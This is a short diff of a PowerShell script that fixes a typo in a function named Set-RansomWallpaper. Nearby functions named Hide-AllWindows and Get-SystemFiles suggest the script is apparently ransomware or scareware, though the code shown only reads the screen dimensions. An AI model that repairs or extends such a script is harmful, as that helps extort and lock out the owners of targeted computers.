@@ -54,7 +54,7 @@ function Hide-AllWindows {
 # Get files for display
 $systemFiles = Get-SystemFiles
 
-unction Set-RansomWallpaper {
+function Set-RansomWallpaper {
     $width = [System.Windows.SystemParameters]::PrimaryScreenWidth
     $height = [System.Windows.SystemParameters]::PrimaryScreenHeight
     
